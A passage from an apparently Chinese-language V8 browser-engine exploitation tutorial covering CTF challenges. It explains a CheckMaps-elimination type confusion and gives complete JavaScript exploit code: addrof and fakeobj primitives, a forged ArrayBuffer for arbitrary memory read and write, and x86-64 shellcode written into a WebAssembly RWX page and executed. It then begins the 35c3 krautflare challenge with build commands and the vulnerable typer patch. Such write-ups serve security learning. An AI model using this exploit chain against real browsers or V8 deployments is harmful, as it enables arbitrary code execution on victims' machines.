<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">LoadEliminationPhase</span> &#123;</span><br><span class="line">  <span class="function"><span class="type">static</span> <span class="type">const</span> <span class="type">char</span>* <span class="title">phase_name</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> <span class="string">&quot;V8.TFLoadElimination&quot;</span>; &#125;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line">    <span class="function">RedundancyElimination <span class="title">redundancy_elimination</span><span class="params">(&amp;graph_reducer, temp_zone)</span></span>;</span><br><span class="line">    ...</span><br><span class="line">    <span class="built_in">AddReducer</span>(data, &amp;graph_reducer, &amp;redundancy_elimination);</span><br><span class="line">    ...</span><br><span class="line">    graph_reducer.<span class="built_in">ReduceGraph</span>();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<p>观察 <code>kCheckMaps</code> 优化前后 <code>trigger</code> 函数的变化。<br>在 <code>kCheckMaps</code> 优化前，有两处 <code>CheckMaps</code> 操作，一个在 <code>a[0];</code> 前，另一个在 <code>return a[0];</code> 前。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/d95d1bd2b7158e24a294f4a4d5138ebb.png"
                      alt="在这里插入图片描述"
                ><br><code>kCheckMaps</code> 优化后，第二处 <code>CheckMaps</code> 操作被优化掉，这是因为 <code>kCheckMaps</code> 优化认为第一次 <code>CheckMaps</code> 检查的条件包含了第二次 <code>CheckMaps</code> 检查的条件，所以可以去掉。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/6acf64ba4f00381a5b252aac0335a128.png"
                      alt="在这里插入图片描述"
                ><br>然而两次 <code>kCheckMaps</code> 之间调用 <code>callback</code> 函数会修改 <code>map</code> 属性，浮点数数组变为 object 数组，然而在 <code>trigger</code> 函数中依然认为这个数组是浮点数数组，因此可以造成类型混淆，从而实现 address of 利用原语。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/35b7a940cdd238331c8b0b0141a1c066.png"
                      alt="在这里插入图片描述"
                ><br>同理，fake object 原语也可以实现。</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> array_buffer = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">0x8</span>);</span><br><span class="line"><span class="keyword">let</span> data_view = <span class="keyword">new</span> <span class="title class_">DataView</span>(array_buffer);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">d2u</span>(<span class="params">value</span>) &#123;</span><br><span class="line">    data_view.<span class="title function_">setFloat64</span>(<span class="number">0</span>, value);</span><br><span class="line">    <span class="keyword">return</span> data_view.<span class="title function_">getBigUint64</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">u2d</span>(<span class="params">value</span>) &#123;</span><br><span class="line">    data_view.<span class="title function_">setBigUint64</span>(<span class="number">0</span>, value);</span><br><span class="line">    <span class="keyword">return</span> data_view.<span class="title function_">getFloat64</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hex</span>(<span class="params">val</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;0x&#x27;</span> + val.<span class="title function_">toString</span>(<span class="number">16</span>).<span class="title function_">padStart</span>(<span class="number">16</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">address_of</span>(<span class="params">obj</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> a = [<span class="number">.1</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">trigger</span>(<span class="params">callback</span>) &#123;</span><br><span class="line">        <span class="comment">// Generate first MapCheck</span></span><br><span class="line">        a[<span class="number">0</span>];</span><br><span class="line">        <span class="comment">// This callback could change the Map ...</span></span><br><span class="line">        <span class="title function_">callback</span>();</span><br><span class="line">        <span class="comment">// ... but this MapCheck will still be removed ¯\_(ツ)_/¯</span></span><br><span class="line">        <span class="keyword">return</span> a[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">evil_callback</span>(<span class="params"></span>) &#123;</span><br><span class="line">        a[<span class="number">0</span>] = obj;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++) &#123;</span><br><span class="line">        <span class="title function_">trigger</span>(<span class="function">() =&gt;</span> &#123; &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">d2u</span>(<span class="title function_">trigger</span>(evil_callback));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">fake_object</span>(<span class="params">addr</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> a = [<span class="number">.1</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">trigger</span>(<span class="params">callback</span>) &#123;</span><br><span class="line">        <span class="comment">// Generate first MapCheck</span></span><br><span class="line">        a[<span class="number">0</span>];</span><br><span class="line">        <span class="comment">// This callback could change the Map ...</span></span><br><span class="line">        <span class="title function_">callback</span>();</span><br><span class="line">        <span class="comment">// ... but this MapCheck will still be removed ¯\_(ツ)_/¯</span></span><br><span class="line">        a[<span class="number">0</span>] = addr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">evil_callback</span>(<span class="params"></span>) &#123;</span><br><span class="line">        a[<span class="number">0</span>] = &#123;&#125;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++) &#123;</span><br><span class="line">        <span class="title function_">trigger</span>(<span class="function">() =&gt;</span> &#123; &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">trigger</span>(evil_callback);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> a[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> obj = <span class="title function_">fake_object</span>(<span class="title function_">u2d</span>(<span class="title function_">address_of</span>(array_buffer)));</span><br><span class="line"></span><br><span class="line">% <span class="title class_">DebugPrint</span>(obj);</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/e56933efd1535fd7f7a43936eeb26928.png"
                      alt="在这里插入图片描述"
                ></p>
<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>前面漏洞分析已经构造出 address of 和 fake object 两个利用原语，因此后续利用和前面的 OOB 一致。不过需要注意的是， <code>address_of</code> 函数在用过一次之后已经被 JIT 了，后续如果用到这个函数需要再定义一个。</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">gc</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Array</span>(<span class="number">0x100000</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> array_buffer = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">0x8</span>);</span><br><span class="line"><span class="keyword">let</span> data_view = <span class="keyword">new</span> <span class="title class_">DataView</span>(array_buffer);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">d2u</span>(<span class="params">value</span>) &#123;</span><br><span class="line">    data_view.<span class="title function_">setFloat64</span>(<span class="number">0</span>, value);</span><br><span class="line">    <span class="keyword">return</span> data_view.<span class="title function_">getBigUint64</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">u2d</span>(<span class="params">value</span>) &#123;</span><br><span class="line">    data_view.<span class="title function_">setBigUint64</span>(<span class="number">0</span>, value);</span><br><span class="line">    <span class="keyword">return</span> data_view.<span class="title function_">getFloat64</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hex</span>(<span class="params">val</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;0x&#x27;</span> + val.<span class="title function_">toString</span>(<span class="number">16</span>).<span class="title function_">padStart</span>(<span class="number">16</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">address_of1</span>(<span class="params">obj</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> a = [<span class="number">.1</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">trigger</span>(<span class="params">callback</span>) &#123;</span><br><span class="line">        <span class="comment">// Generate first MapCheck</span></span><br><span class="line">        a[<span class="number">0</span>];</span><br><span class="line">        <span class="comment">// This callback could change the Map ...</span></span><br><span class="line">        <span class="title function_">callback</span>();</span><br><span class="line">        <span class="comment">// ... but this MapCheck will still be removed ¯\_(ツ)_/¯</span></span><br><span class="line">        <span class="keyword">return</span> a[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">evil_callback</span>(<span class="params"></span>) &#123;</span><br><span class="line">        a[<span class="number">0</span>] = obj;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++) &#123;</span><br><span class="line">        <span class="title function_">trigger</span>(<span class="function">() =&gt;</span> &#123; &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">d2u</span>(<span class="title function_">trigger</span>(evil_callback));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">address_of2</span>(<span class="params">obj</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> a = [<span class="number">.1</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">trigger</span>(<span class="params">callback</span>) &#123;</span><br><span class="line">        <span class="comment">// Generate first MapCheck</span></span><br><span class="line">        a[<span class="number">0</span>];</span><br><span class="line">        <span class="comment">// This callback could change the Map ...</span></span><br><span class="line">        <span class="title function_">callback</span>();</span><br><span class="line">        <span class="comment">// ... but this MapCheck will still be removed ¯\_(ツ)_/¯</span></span><br><span class="line">        <span class="keyword">return</span> a[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">evil_callback</span>(<span class="params"></span>) &#123;</span><br><span class="line">        a[<span class="number">0</span>] = obj;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++) &#123;</span><br><span class="line">        <span class="title function_">trigger</span>(<span class="function">() =&gt;</span> &#123; &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">d2u</span>(<span class="title function_">trigger</span>(evil_callback));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">fake_object</span>(<span class="params">addr</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> a = [<span class="number">.1</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">trigger</span>(<span class="params">callback</span>) &#123;</span><br><span class="line">        <span class="comment">// Generate first MapCheck</span></span><br><span class="line">        a[<span class="number">0</span>];</span><br><span class="line">        <span class="comment">// This callback could change the Map ...</span></span><br><span class="line">        <span class="title function_">callback</span>();</span><br><span class="line">        <span class="comment">// ... but this MapCheck will still be removed ¯\_(ツ)_/¯</span></span><br><span class="line">        a[<span class="number">0</span>] = <span class="title function_">u2d</span>(addr);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">evil_callback</span>(<span class="params"></span>) &#123;</span><br><span class="line">        a[<span class="number">0</span>] = &#123;&#125;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++) &#123;</span><br><span class="line">        <span class="title function_">trigger</span>(<span class="function">() =&gt;</span> &#123; &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">trigger</span>(evil_callback);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> a[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ab = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">0x1000</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_">gc</span>();</span><br><span class="line"><span class="keyword">var</span> fake_ab_mem = [</span><br><span class="line">    <span class="title function_">u2d</span>(<span class="number">0n</span>),                    <span class="comment">// Map</span></span><br><span class="line">    <span class="title function_">u2d</span>(<span class="number">0n</span>),                    <span class="comment">// Propertries</span></span><br><span class="line">    <span class="title function_">u2d</span>(<span class="number">0n</span>),                    <span class="comment">// Elements</span></span><br><span class="line">    <span class="title function_">u2d</span>(<span class="number">0x1000n</span>),               <span class="comment">// ByteLength</span></span><br><span class="line">    <span class="title function_">u2d</span>(<span class="number">0n</span>),                    <span class="comment">// BackingStore</span></span><br><span class="line">    <span class="title function_">u2d</span>(<span class="number">0n</span>),                    <span class="comment">// Map</span></span><br><span class="line">    <span class="title function_">u2d</span>(<span class="number">0x1900042317080808n</span>),   <span class="comment">// type</span></span><br><span class="line">];</span><br><span class="line"><span class="title function_">gc</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> fake_ab_addr = <span class="title function_">address_of1</span>(fake_ab_mem) + <span class="number">0x30n</span>;</span><br><span class="line">fake_ab_mem[<span class="number">0</span>] = <span class="title function_">u2d</span>(fake_ab_addr + <span class="number">0x28n</span>);</span><br><span class="line"><span class="keyword">var</span> fake_ab = <span class="title function_">fake_object</span>(fake_ab_addr);</span><br><span class="line"><span class="keyword">var</span> dv = <span class="keyword">new</span> <span class="title class_">DataView</span>(fake_ab);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">arbitrary_address_read</span>(<span class="params">address</span>) &#123;</span><br><span class="line">    fake_ab_mem[<span class="number">4</span>] = <span class="title function_">u2d</span>(address);</span><br><span class="line">    <span class="keyword">return</span> dv.<span class="title function_">getBigUint64</span>(<span class="number">0</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">arbitrary_address_write</span>(<span class="params">address, value</span>) &#123;</span><br><span class="line">    fake_ab_mem[<span class="number">4</span>] = <span class="title function_">u2d</span>(address);</span><br><span class="line">    <span class="keyword">return</span> dv.<span class="title function_">setBigUint64</span>(<span class="number">0</span>, value, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">print</span>(<span class="string">&quot;fake ab addr: &quot;</span>+<span class="title function_">hex</span>(fake_ab_addr));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> wasm_code = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>([<span class="number">0</span>, <span class="number">97</span>, <span class="number">115</span>, <span class="number">109</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">133</span>, <span class="number">128</span>, <span class="number">128</span>,</span><br><span class="line">    <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">96</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">127</span>, <span class="number">3</span>, <span class="number">130</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">132</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">1</span>, <span class="number">112</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">131</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">129</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">7</span>, <span class="number">145</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">109</span>, <span class="number">111</span>, <span class="number">114</span>, <span class="number">121</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">109</span>,</span><br><span class="line">    <span class="number">97</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">138</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">132</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">65</span>,</span><br><span class="line">    <span class="number">42</span>, <span class="number">11</span>]);</span><br><span class="line"><span class="keyword">let</span> wasm_mod = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Instance</span>(<span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Module</span>(wasm_code));</span><br><span class="line"><span class="keyword">let</span> f = wasm_mod.<span class="property">exports</span>.<span class="property">main</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> rwx_mem_addr = <span class="title function_">arbitrary_address_read</span>(<span class="title function_">address_of2</span>(wasm_mod) - <span class="number">1n</span> + <span class="number">0x88n</span>);</span><br><span class="line"><span class="title function_">print</span>(<span class="string">&quot;[*] rwx mem addr: &quot;</span> + <span class="title function_">hex</span>(rwx_mem_addr));</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> shellcode = [</span><br><span class="line">    <span class="number">0x636c6163782fb848n</span>,</span><br><span class="line">    <span class="number">0x73752fb848500000n</span>,</span><br><span class="line">    <span class="number">0x8948506e69622f72n</span>,</span><br><span class="line">    <span class="number">0x89485750c03148e7n</span>,</span><br><span class="line">    <span class="number">0x3ac0c748d23148e6n</span>,</span><br><span class="line">    <span class="number">0x4944b84850000030n</span>,</span><br><span class="line">    <span class="number">0x48503d59414c5053n</span>,</span><br><span class="line">    <span class="number">0x485250c03148e289n</span>,</span><br><span class="line">    <span class="number">0x00003bc0c748e289n</span>,</span><br><span class="line">    <span class="number">0x0000000000050f00n</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; shellcode.<span class="property">length</span>; i++) &#123;</span><br><span class="line">    <span class="title function_">arbitrary_address_write</span>(rwx_mem_addr + <span class="title class_">BigInt</span>(i) * <span class="number">8n</span>, shellcode[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">f</span>();</span><br></pre></td></tr></table></figure></div>
<h2 id="例题：35c3-krautflare"><a href="#例题：35c3-krautflare" class="headerlink" title="例题：35c3 krautflare"></a>例题：35c3 krautflare</h2><h3 id="环境搭建-2"><a href="#环境搭建-2" class="headerlink" title="环境搭建"></a>环境搭建</h3><p><a class="link"   href="https://gitcode.net/qq_45323960/attachment/-/tree/master/v8_pwn/35c3_krautflare" >附件下载链接 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/sroettger/35c3ctf_chals</span><br><span class="line">mv 35c3ctf_chals/krautflare .</span><br><span class="line">cd v8</span><br><span class="line">git checkout dde25872f58951bb0148cf43d6a504ab2f280485</span><br><span class="line">git apply ../../test/krautflare/attachments/revert-bugfix-880207.patch</span><br><span class="line">gclient sync</span><br><span class="line">tools/dev/gm.py x64.release</span><br></pre></td></tr></table></figure></div>
<h3 id="漏洞分析-2"><a href="#漏洞分析-2" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>题目主要 patch 了优化的 Typer 阶段：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line">diff --git a/src/compiler/typer.cc b/src/compiler/typer.cc</span><br><span class="line">index <span class="number">60e7</span>ed574a.<span class="number">.8324</span>dc06d7 <span class="number">100644</span></span><br><span class="line">--- a/src/compiler/typer.cc</span><br><span class="line">+++ b/src/compiler/typer.cc</span><br><span class="line">@@ <span class="number">-1491</span>,<span class="number">6</span> <span class="number">+1491</span>,<span class="number">7</span> @@ Type Typer::Visitor::<span class="built_in">JSCallTyper</span>(Type fun, Typer* t) &#123;</span><br><span class="line">     <span class="comment">// Unary math functions.</span></span><br><span class="line">     <span class="keyword">case</span> BuiltinFunctionId::kMathAbs:</span><br><span class="line">     <span class="keyword">case</span> BuiltinFunctionId::kMathExp:</span><br><span class="line">+    <span class="keyword">case</span> BuiltinFunctionId::kMathExpm1:</span><br><span class="line">       <span class="keyword">return</span> Type::<span class="built_in">Union</span>(Type::<span class="built_in">PlainNumber</span>(), Type::<span class="built_in">NaN</span>(), t-&gt;<span class="built_in">zone</span>());</span><br><span class="line">     <span class="keyword">case</span> BuiltinFunctionId::kMathAcos:</span><br><span class="line">     <span class="keyword">case</span> BuiltinFunctionId::kMathAcosh:</span><br><span class="line">@@ <span class="number">-1500</span>,<span class="number">7</span> <span class="number">+1501</span>,<span class="number">6</span> @@ Type Typer::Visitor::<span class="built_in">JSCallTyper</span>(Type fun, Typer* t) &#123;</span><br><span class="line">     <span class="keyword">case</span> BuiltinFunctionId::kMathAtanh:</span><br><span class="line">     <span class="keyword">case</span> BuiltinFunctionId::kMathCbrt:</span><br><span class="line">     <span class="keyword">case</span> BuiltinFunctionId::kMathCos:</span><br><span class="line">-    <span class="keyword">case</span> BuiltinFunctionId::kMathExpm1:</span><br><span class="line">     <span class="keyword">case</span> BuiltinFunctionId::kMathFround:</span><br><span class="line">     <span class="keyword">case</span> BuiltinFunctionId::kMathLog:</span><br><span class="line">     <span class="keyword">case</span> BuiltinFunctionId::kMathLog1p:</span><br></pre></td></tr></table></figure></div>
<p>原本 Typer 阶段预测 <code>kMathExpm1</code> 的返回值类型是 <code>Type::Number()</code> ，经过 patch 之后现在变成了 <code>Type::PlainNumber()</code> 或 <code>Type::NaN()</code> 。</p>
<p>在 <code>src/compiler/types.h</code> 中定义了各种数字类型的范围：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">  ON    OS32     N31     U30     OU31    OU32     ON</span><br><span class="line">______[_______[_______[_______[_______[_______[_______</span><br><span class="line">    -2^31   -2^30     0      2^30    2^31    2^32</span><br></pre></td></tr></table></figure></div>
<ul>
<li>OtherNumber（ON）：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mo>−</mo><mi mathvariant="normal">∞</mi><mo separator="true">,</mo><mo>−</mo><msup><mn>2</mn><mn>31</mn></msup><mo stretchy="false">)</mo><mo>∪</mo><mo stretchy="false">[</mo><msup><mn>2</mn><mn>32</mn></msup><mo separator="true">,</mo><mi mathvariant="normal">∞</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(−\infin,−2^{31})\cup [2^{32},\infin)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0641em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">−</span><span class="mord">∞</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">−</span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">31</span></span></span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∪</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1.0641em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">32</span></span></span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">∞</span><span class="mclose">)</span></span></span></span></li>
<li>OtherSigned32（OS32） ：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mo>−</mo><msup><mn>2</mn><mn>31</mn></msup><mo separator="true">,</mo><mo>−</mo><msup><mn>2</mn><mn>30</mn></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">[−2^{31},−2^{30})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0641em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">−</span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">31</span></span></span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">−</span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">30</span></span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></li>
<li>Negative31（N31）：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mo>−</mo><msup><mn>2</mn><mn>30</mn></msup><mo separator="true">,</mo><mn>0</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">[−2^{30},0)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0641em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">−</span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">30</span></span></span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">0</span><span class="mclose">)</span></span></span></span></li>
<li>Unsigned30（U30）: <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>0</mn><mo separator="true">,</mo><msup><mn>2</mn><mn>30</mn></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">[0,2^{30})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0641em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">30</span></span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></li>
